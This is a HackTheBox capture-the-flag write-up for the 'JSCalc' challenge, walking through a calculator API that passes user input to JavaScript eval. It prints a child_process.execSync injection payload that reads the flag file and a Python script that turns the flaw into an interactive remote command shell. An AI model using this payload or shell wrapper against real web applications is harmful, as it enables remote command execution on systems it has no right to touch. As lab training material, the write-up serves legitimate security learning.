---
title: HackTheBox -- JSCalc Writeup
date: 2025-08-28 00:00:00 +0800
categories: [web challenges]
tags: [Code-Injection,eval]
image:
    path: images/hackthebox.png
---
# HackTheBox ‚Äî JSCalc [Easy]

In this write-up, we will solve the **JSCalc** challenge from HackTheBox. The goal is to analyze the web application, identify its weaknesses, and use them to gain command execution in order to retrieve the flag. Along the way, we will break down each step of the exploitation process to clearly demonstrate how the vulnerability can be discovered and leveraged.

Let‚Äôs navigate to the website.

![image.png](../images/JSCalc.png)

> As we see it‚Äôs a simple calculator
> 

Now let‚Äôs review The Code.

![image.png](../images/JSCalc%201.png)

> Notice that we found an api calculate endpoint that takes our input and call a function named calculate
> 

Now let‚Äôs go review the calculate function.

![image.png](../images/JSCalc%202.png)

> Notice that we found that the user input land in eval function
> 

Now let‚Äôs go write a payload that will get us the flag

```jsx
require('child_process').execSync('cat ../flag.txt').toString();
```

![image.png](../images/JSCalc%203.png)

> Amazing we go the flag!
> 

Now let‚Äôs go and automate the exploitation using python script

```python
import requests
import cmd

url = "http://localhost:1337/api/calculate"

def execute_command(command: str):
    data_json = {"formula": f"require('child_process').execSync('{command}').toString();"}
    r = requests.post(url, json=data_json, verify=False)
    print(r.text)

class MyShell(cmd.Cmd):
    prompt = "command> "

    def default(self, line):
        execute_command(line)

if __name__ == "__main__":
    MyShell().cmdloop()

```

![image.png](../images/JSCalc%204.png)

Now let‚Äôs go and run the script

![image.png](../images/JSCalc%205.png)

üéØ Conclusion

By following the exploitation path and carefully analyzing the challenge, we were able to identify the vulnerability, execute arbitrary commands, and successfully obtain the flag. This highlights the importance of secure coding practices and the risks of improper input handling in web applications.

*Written by **SecretRemo*** ‚úçÔ∏è

CRTE | CRTP | CRTO | eWPTX | eCPPT | eMAPT